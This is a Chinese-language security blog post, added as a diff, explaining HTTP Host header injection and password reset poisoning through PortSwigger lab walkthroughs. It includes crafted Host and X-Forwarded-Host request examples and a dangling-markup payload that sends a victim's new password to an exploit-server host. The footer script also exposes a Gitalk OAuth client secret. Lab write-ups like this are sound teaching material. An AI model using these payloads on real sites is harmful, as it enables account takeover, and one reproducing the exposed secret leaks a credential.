@@ -1,0 +1,334 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>Host头部注入：Password Reset Poisoning | Today is new</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://0xwi11.github.io/favicon.ico?v=1706710799621">
+<link rel="stylesheet" href="https://0xwi11.github.io/styles/main.css">
+
+
+  
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css" />
+  
+
+  
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="1. HTTP头攻击
+1.1 什么是 HTTP 头
+HTTP协议中，HTTP头是在HTTP报文第一行（请求行/响应行）之后，请求体/响应体之前的文本数据，用于传递附加信息。其基本格式为：HTTP头名称+英文冒号+具体值，具体值之前的空格会被..." />
+    <meta name="keywords" content="" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://0xwi11.github.io">
+        <img src="https://0xwi11.github.io/images/avatar.png?v=1706710799621" class="site-logo">
+        <h1 class="site-title">Today is new</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+          <a class="social-link" href="https://github.com/0xWi11?tab=overview&amp;from=2023-02-01&amp;to=2023-02-28" target="_blank">
+            <i class="fab fa-github"></i>
+          </a>
+        
+      
+        
+          <a class="social-link" href="https://twitter.com/0xwi11" target="_blank">
+            <i class="fab fa-twitter"></i>
+          </a>
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      相信美好的事情将会发生
+    </div>
+    <div class="site-footer">
+      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://0xwi11.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">Host头部注入：Password Reset Poisoning</h2>
+            <div class="post-date">2022-03-09</div>
+            
+            <div class="post-content" v-pre>
+              <h2 id="1-http头攻击">1. HTTP头攻击</h2>
+<h2 id="11-什么是-http-头">1.1 什么是 HTTP 头</h2>
+<p>HTTP协议中，HTTP头是在HTTP报文第一行（请求行/响应行）之后，请求体/响应体之前的文本数据，用于传递附加信息。其基本格式为：HTTP头名称+英文冒号+具体值，具体值之前的空格会被忽略，但建议添加空格，例如：<code>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)。</code><br>
+　　各个HTTP作用不同，详见Mozilla官方文档。</p>
+<h2 id="12-什么是-http-host-头">1.2 什么是 HTTP Host 头</h2>
+<p>HTTP Host头由客户端发送，格式如<code>Host: portswigger.net</code>，其作用是：标识客户端浏览器要与哪个域通信，通常用在服务器配置了多个虚拟主机或者使用CDN的情景下。例如下面NGINX的配置，单个IP地址（甚至是同一个端口）托管了多个域：</p>
+<pre><code>server {
+        listen 8000;
+        server_name noa.icu;
+        location / {
+                root /var/www/html/public;
+                index index.html index2.html index3.html;
+        }
+
+}
+# 多个Server可以配置相同的端口，使用不同的主机名区分
+server {
+        listen 8000;
+        server_name localhost;
+
+        location / {
+                root html;
+                index index.html index2.html index3.html;
+        }
+}
+</code></pre>
+<p>客户端发送的请求中，HTTP头为localhost，会匹配到NGINX默认页面。</p>
+<pre><code>[root@Y conf.d]# curl http://localhost:8000 -H &quot;Host: localhost&quot;
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;title&gt;Welcome to nginx!&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;h1&gt;Welcome to nginx!&lt;/h1&gt;
+&lt;p&gt;If you see this page, the nginx web server is successfully installed and
+working. Further configuration is required.&lt;/p&gt;
+# 下略
+</code></pre>
+<p>客户端发送的请求中，HTTP头为noa.icu，会匹配到Hugo页面（Web应用页面）。</p>
+<pre><code>[root@Y conf.d]# curl http://localhost:8000 -H &quot;Host: noa.icu&quot;
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;zh-CN&quot;&gt;
+    &lt;head&gt;
+        &lt;meta name=&quot;generator&quot; content=&quot;Hugo 0.92.2&quot; /&gt;
+        &lt;meta charset=&quot;utf-8&quot;&gt;
+        &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;
+        &lt;meta name=&quot;robots&quot; content=&quot;noodp&quot; /&gt;
+# 下略
+</code></pre>
+<h2 id="13-对-http-host-头的攻击">1.3 对 HTTP Host 头的攻击</h2>
+<p>若服务器隐式信任客户端发送的Host头，且未能正确验证或转义，攻击者可能能够向Host头的具体内容中填入恶意Payload，从而影响或者操纵服务器行为，这种攻击方式称为HTTP主机头攻击（HTTP Host header attack）。</p>
+<p>例如，Web应用程序不知道自身位于哪个域中（现代Web应用程序很常见，如多个不同单位采购了同一套Web应用），且开发或运维人员未在配置文件中手动指定域，但应用程序某些功能需要知道当前域才能实现（如重置密码时，后端生成重置密码的URL并发送至用户邮箱），后端可能将客户端发送的Host头看作当前域，从而导致漏洞。</p>
+<p>HTTP其他标头还可用于网站基础设施的不同系统之间的各种交互，这也可能导致漏洞（如Nacos漏洞CVE-2021-29441，攻击者可以通过修改HTTP请求报文中User-Agent字段为 <code>Nacos-Server</code> ，利用UA白名单绕过API鉴权，直接进入管理页面）。</p>
+<h2 id="14-识别-http-host-头漏洞">1.4 识别 HTTP Host 头漏洞</h2>
+<p>若修改 HTTP Host 头后，正常的HTTP请求仍然能够到达目标应用程序，则可以使用该标头探测应用程序，并观察对HTTP响应的影响。</p>
+<ul>
+<li>提供任意主机头<br>
+　　第一步是提供任意、无法识别的域名，并观察服务器响应。有时提供了不合理的主机头后，仍可正常访问目标网站，可能是由于服务器配置了默认或回退选项。若根本无法访问应用程序，出现<code>Invalid Host header</code>之类的错误，可能是由于目标Web应用程序使用了CDN等服务。</li>
+</ul>
+<p>若请求是由于某些原因被阻止（如Web应用检查Host头中的域名和SNI中的域名是否匹配），而非Invalid Host header类似错误，并不意味着目标Web应用一定不受主机头攻击的影响。</p>
+<ul>
+<li>检查验证是否存在缺陷<br>
+　　例1：后端可能只验证Host头中的域名而忽略端口，可以在端口处填入非数字端口，即可保持域名不变，确保HTTP请求到达目标并通过端口处注入Payload</li>
+</ul>
+<pre><code>GET /example HTTP/1.1
+Host: vulnerable-website.com:bad-stuff-here
+</code></pre>
+<p>例2：后端通过匹配允许任意子域，即：仅允许特定结尾的Host值，该情况下可以注册一个与白名单域名相同字符结尾的域名绕过安全认证，或者利用安全程度低的子域名。</p>
+<pre><code>GET /example HTTP/1.1
+Host: notvulnerable-website.com
+</code></pre>
+<pre><code>GET /example HTTP/1.1
+Host: hacked-subdomain.vulnerable-website.com
+</code></pre>
+<ul>
+<li>发送不明确请求<br>
+　　对HTTP Host头进行验证的代码和存在漏洞的代码可能位于不同的应用程序组件中，甚至存在于不同的服务器上。通过识别、利用二者对Host标头处理的差异，发送一个模棱两可的请求，使服务端在验证Host头代码和存在漏洞的代码中，解析到的Host头不同。</li>
+</ul>
+<p>例1：添加重复的主机头，假设前端解析HTTP请求中第一个主机头，后端解析HTTP请求中最后一个主机头，可以使用第一个标头来确保将请求路由到预期目标，并使用第二个标头将Payload传递到服务器端代码中。</p>
+<pre><code>GET /example HTTP/1.1
+Host: vulnerable-website.com
+Host: bad-stuff-here
+</code></pre>
+<p>例2：提供绝对网址，一般来说HTTP请求行的路径为相对路径，但许多服务器的配置也可以解析绝对路径。可以尝试在一个HTTP数据包中，HTTP请求行中填入绝对路径URL（还可以尝试不同的协议），Host标头填入Payload。</p>
+<pre><code>GET https://vulnerable-website.com/example HTTP/1.1
+Host: bad-stuff-here
+</code></pre>
+<p>例3：添加缩进，通过使用空格字符缩进 HTTP 标头，某些服务器会将缩进的标头解释为换行，进而将该HTTP头视为前一个HTTP标头值的一部分。某些服务器会完全忽略缩进，正常解析带缩进的标头。例如网站阻止多个 Host 标头的请求，但可以通过缩进其中一个来绕过此验证。如果前端忽略缩进标头，则请求将作为 的 <code>vulnerable-website.com</code> 普通请求进行处理。后端忽略前面的空格，并在重复的情况下优先处理第一个标头。</p>
+<pre><code>GET /example HTTP/1.1
+    Host: bad-stuff-here
+Host: vulnerable-website.com
+</code></pre>
+<ul>
+<li>注入覆盖Host标头<br>
+　　当网站配置了负载均衡或者反向代理服务器时，后端接收的Host头很可能是负载均衡或反向代理等中间系统的域名。后端为了获取客户端请求的Host头原始值，通常会在负载均衡或反向代理服务器引入<code>X-Forwarded-Host</code>头，后端会将该值看作客户端请求的Host原始值。因此当客户端发送的请求存在<code>X-Forwarded-Host</code>头时，即使应用程序没有使用负载均衡或反向代理，很多后端框架会将<code>X-Forwarded-Host</code>看作客户端请求的Host原始值，从而覆盖当前数据包中的Host头的值。</li>
+</ul>
+<pre><code>GET /example HTTP/1.1
+Host: vulnerable-website.com
+X-Forwarded-Host: bad-stuff-here
+</code></pre>
+<p>由于<code>X-Forwarded-Host</code>头是事实标准而非HTTP规范，如下这些标头可能有相同作用：<code>X-Host</code>、<code>X-Forwarded-Serve</code>r、<code>X-HTTP-Host-Override</code>、<code>Forwarded</code>。</p>
+<h2 id="2-密码重置投毒漏洞">2. 密码重置投毒漏洞</h2>
+<h2 id="21-密码重置的工作流程">2.1 密码重置的工作流程</h2>
+<p>1、用户输入邮箱，提交重置密码请求<br>
+2、应用程序后端检查用户是否存在，并为其生成一个临时的、唯一的、高熵的Token，并将该Token与用户账户关联。<br>
+3、应用程序后端为用户生成重置密码的URL，并通过邮件发送至用户邮箱，类似 <code>https://normal-website.com/reset?token=0a1b2c3d4e5f6g7h8i9j</code><br>
+4、用户登录邮箱并点击URL，应用程序验证Token通过后，跳转至重置密码页面，重置密码后销毁Token。</p>
+<h2 id="22-漏洞原理">2.2 漏洞原理</h2>
+<p>漏洞出现在上述过程中的第三步，用户使用邮箱重置账户密码时，应用程序需要知道当前域名，并根据域名生成重置密码的URL并发送用户邮箱。<br>
+　　当网站开发人员或运维人员未在配置文件中手动指定当前域，后端可能将客户端发送的Host头看作当前应用的域，攻击者通过自定义Host头生成指向受其控制的恶意域的密码重置链接，用户登录邮箱并点击URL后，实际访问的是攻击者恶意域下的网站，由此攻击者窃取重置密码所需Token，并最终破坏其帐户。</p>
+<h2 id="23-案例演示">2.3 案例演示</h2>
+<ul>
+<li>
+<p>以 PortSwigger 靶场(简单) 为例<br>
+　　用户选择忘记密码，填写用户名后，系统会生成重置密码的Token并发送至用户邮箱。<br>
+<img src="https://0xwi11.github.io/post-images/1706708687051.png" alt="" loading="lazy"><br>
+　　用户登录个人邮箱接收邮件，访问邮件中的URL，即可输入新密码，完成密码重置。<br>
+<img src="https://0xwi11.github.io/post-images/1706708667612.png" alt="" loading="lazy"><br>
+　　在上述提交用户名的数据包中，将原始的Host头内容替换受自己控制的域名后，用户收到的URL是拼接了恶意域名的URL，证明服务器存在密码重置投毒漏洞。<br>
+<img src="https://0xwi11.github.io/post-images/1706708696743.png" alt="" loading="lazy"><br>
+<img src="https://0xwi11.github.io/post-images/1706708700783.png" alt="" loading="lazy"><br>
+　　若用户或用户的邮箱安全软件访问/扫描了该URL，则攻击者则可以通过查看访问记录获取到用户的密码重置Token：<br>
+<img src="https://0xwi11.github.io/post-images/1706708711103.png" alt="" loading="lazy"><br>
+　　后续攻击者可以通过该Token拼接正确的重置密码URL，并对受害者的账号密码进行重置。</p>
+</li>
+<li>
+<p>PortSwigger 靶场(中等) :<br>
+　　修改Host头会报错，但可以通过添加X-Forwarded-Host头覆盖Host头，实现上述攻击。<br>
+<img src="https://0xwi11.github.io/post-images/1706708742993.png" alt="" loading="lazy"><br>
+<img src="https://0xwi11.github.io/post-images/1706708747180.png" alt="" loading="lazy"></p>
+</li>
+<li>
+<p>PortSwigger 靶场(困难)<br>
+　　服务器向客户端邮箱发送的是新密码，URL只是网站用户登录页，这种情况下URL不携带Token，即使通过Host头或X-Forwarded-Host头能够修改生成的URL的域，被攻击者访问该URL后也不携带Token或密码。<br>
+　　该案例中，修改Host头为其他域会直接导致报错，但发现该Host头的端口若为非数字Payload，不会导致报错。<br>
+<img src="https://0xwi11.github.io/post-images/1706708764117.png" alt="" loading="lazy"><br>
+　　收到的邮件中也携带该Payoad，但无法通过修改Payload闭合标签构造携带用户的新密码的URL。<br>
+<img src="https://0xwi11.github.io/post-images/1706708772206.png" alt="" loading="lazy"><br>
+　发现邮件中标签使用的都是单引号，可以先闭合一部分标签，并且通过悬空标记注入的方式，在受攻击者控制的域名URL前使用一个双引号。因为浏览器未能找到后面一个双引号，浏览器会将双引号后的所有内容识别为URL，从而成功将用户密码填充到URL中。<br>
+　　构造出来的Payload如下：</p>
+</li>
+</ul>
+<pre><code>'&gt;&lt;/a&gt;&lt;a href=&quot;https://exploit-0ab4008504e82217828ce11f01a30069.exploit-server.net
+</code></pre>
+<p><img src="https://0xwi11.github.io/post-images/1706708788058.png" alt="" loading="lazy"><br>
+　　收到的邮件如下：由于双引号未闭合，浏览器会将下图选中部分看作一个URL，该URL中包含用户的新密码。<br>
+<img src="https://0xwi11.github.io/post-images/1706708798571.png" alt="" loading="lazy"><br>
+若被攻击者的安全软件自动扫描了该邮件，会直接访问上述URL，攻击者可在访问日志中直接看到被攻击者的新密码。<br>
+<img src="https://0xwi11.github.io/post-images/1706708810583.png" alt="" loading="lazy"></p>
+
+            </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://0xwi11.github.io/post/log4j-lou-dong-fu-xian1/">
+                  <h3 class="post-title">
+                    Log4j漏洞复现
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+              
+                <div id="gitalk-container" data-aos="fade-in"></div>
+              
+
+              
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+
+  
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+
+      var gitalk = new Gitalk({
+        clientID: 'b2be97bd4f11fa2c7ed0',
+        clientSecret: '7cd82370c455720ef14b1c828ee50582651f71c4',
+        repo: 'bolg-comment',
+        owner: '0xWi11',
+        admin: ['0xWi11'],
+        id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+        distractionFreeMode: false  // Facebook-like distraction free mode
+      })
+
+      gitalk.render('gitalk-container')
+
+    </script>
+  
+
+  
+
+
+
+
+  </body>
+</html>
